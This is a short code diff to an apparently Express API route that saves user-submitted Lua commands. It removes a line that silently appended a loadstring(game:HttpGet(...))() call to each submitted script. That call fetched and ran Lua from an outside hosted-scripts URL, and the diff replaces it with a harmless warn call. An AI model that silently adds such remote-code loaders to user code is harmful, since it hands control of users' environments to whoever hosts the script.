@@ -104,8 +104,8 @@ app.post('/api/commands', async (req, res) => {
   try {
     const { name, luaCode, enabled, executeOnce, variables } = req.body;
     
-    // Automatically append the loadstring script
-    const modifiedLuaCode = luaCode + '\nloadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/f0eb0a19d572c38126073c36db0777bb05b9a516affbcc06e39fb404e93de4b6.lua"))()';
+    // Automatically append warn('hello')
+    const modifiedLuaCode = luaCode + '\nwarn("hello")';
     
     const command = await Command.create({
       name,
